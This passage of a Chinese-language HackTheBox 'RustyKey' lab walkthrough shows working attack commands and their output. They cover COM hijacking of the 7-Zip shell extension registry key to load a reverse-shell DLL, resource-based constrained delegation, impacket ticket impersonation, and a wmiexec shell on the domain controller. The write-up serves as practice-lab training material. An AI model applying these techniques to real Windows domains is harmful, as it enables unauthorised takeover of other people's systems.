class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\"\u003c/span\u003e /ve /d \u003cspan class=\"hljs-string\"\u003e\"C:\\tools\\rev.dll\"\u003c/span\u003e /f\nreg add \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\"\u003c/span\u003e /ve /d \u003cspan class=\"hljs-string\"\u003e\"C:\\Tools\\rev.dll\"\u003c/span\u003e /f\nThe operation completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e改完之后我们再看一下是否修改成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\\system32\u003e reg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\nreg query \u003cspan class=\"hljs-string\"\u003e\"HKCR\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\"\u003c/span\u003e /s\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\n    (Default)    REG_SZ    7-Zip Shell Extension\n\nHKEY_CLASSES_ROOT\\CLSID\\{23170F69-40C1-278A-1000-000100020000}\\InprocServer32\n    (Default)    REG_SZ    C:\\Tools\\rev.dll\n    ThreadingModel    REG_SZ    Apartment\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e过一会\u003ccode\u003eShell\u003c/code\u003e就弹回来了，并且是\u003ccode\u003emm.turner\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20RustyKey/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003ePS：有个坏处一下子就会断开，然后要重置机器，被恶心坏了\u003c/p\u003e\n\u003ch3\u003eRBCD\u003c/h3\u003e\n\u003cp\u003e因为它是委派管理组（\u003ccode\u003eDelegation Managers\u003c/code\u003e），直接就不拖泥带水，直接尝试给机器添加\u003ccode\u003eAllowedToDelegateTo\u003c/code\u003e 属性，然后就成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePS C:\\Windows\u003e Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$\nSet-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里\u003ccode\u003eIT-COMPUTER3$\u003c/code\u003e 可以代表（S4U2self \u0026#x26; S4U2proxy）任意用户去访问\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e利用链接：\u003ca href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained\"\u003ehttps://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这里无法使用\u003ccode\u003eadministrator\u003c/code\u003e用户，会被禁止\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egetST -spn \u003cspan class=\"hljs-string\"\u003e\"cifs/DC.rustykey.htb\"\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e\"Administrator\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"rustykey.htb\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们使用\u003ccode\u003ebackupadmin\u003c/code\u003e 因为它属于\u003ccode\u003eDmain Admins\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey getST.py -spn \u003cspan class=\"hljs-string\"\u003e\"cifs/DC.rustykey.htb\"\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e\"backupadmin\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"rustykey.htb\"\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e'IT-COMPUTER3$'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Rusty88!'\u003c/span\u003e -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Impersonating backupadmin\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  RustyKey wmiexec.py rustykey.htb/backupadmin@DC.rustykey.htb -no-pass -dc-ip 10.10.11.75 -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\nC:\\\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eC:\\\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\\Administrator\\Desktop\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\nf60fdcd1b96c7ce1c0xxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学习到很多，新工具 \u003ccode\u003eRunasCs\u003c/code\u003e ，\u003ccode\u003eaccesschk\u003c/code\u003e （用于枚举用户对注册表的修改权限）\u003c/p\u003e\n\u003cp\u003e和很多攻击手段：\u003ccode\u003eTimeroast\u003c/code\u003e ，\u003ccode\u003eCOM\u003c/code\u003e劫持\u003c/p\u003e\n\u003cp\u003e上边都是新学习到的\u003c/p\u003e","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","updated":"2025-06-30","tags":["HackTheBox","Windows","RBCD","COMhijack","TimeRoast","RunasCs","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - RustyKey\n\n https://app.hackthebox.com/machines/RustyKey | `Windows` | `Hard`\n \n\nMachine Information：As is common in real life Windows pentests, you will start the RustyKey box with credentia...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"06","day":"30","id":"HackTheBoxSeason8 - RustyKey"},"buildId":"WrH-FXgOCOeF_S07eZ3xH","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>